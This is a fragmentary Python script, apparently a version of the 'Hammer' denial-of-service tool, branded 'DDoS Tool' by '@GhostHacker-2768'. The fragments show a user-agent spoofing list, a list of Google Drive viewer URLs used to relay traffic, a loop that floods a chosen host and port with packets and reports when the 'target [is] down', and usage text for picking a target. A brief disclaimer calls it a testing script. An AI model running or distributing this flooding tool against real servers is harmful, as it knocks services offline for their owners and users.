...
def user_agent():
	global uagent
	uagent=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
            ...
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1", no
...
def my_bots():
	global bots
	bots=["https://drive.google.com/viewerng/viewer?url=",
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <<<----packet sent! Server Is Up---->>> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m<<<----no response! target down---->>>\033[0m")
 ...
 [    (    /  / /   /  ,.---,_   `._   _,-','
  \    `-./  / /   /  /       `-._  *** ,-'
   `-._  /  / /   /_,'            **--*
    ...
    :   /    /
    [  /   ,'     ~>DDoS Tool<~
    | /  ,'      ~~>Created By @GhostHacker-2768<~~
    |/,-'
    '    ''')
	print (''' \033[92m	Hammer New version created by @GhostHacker-2768
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 ghosthacker.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
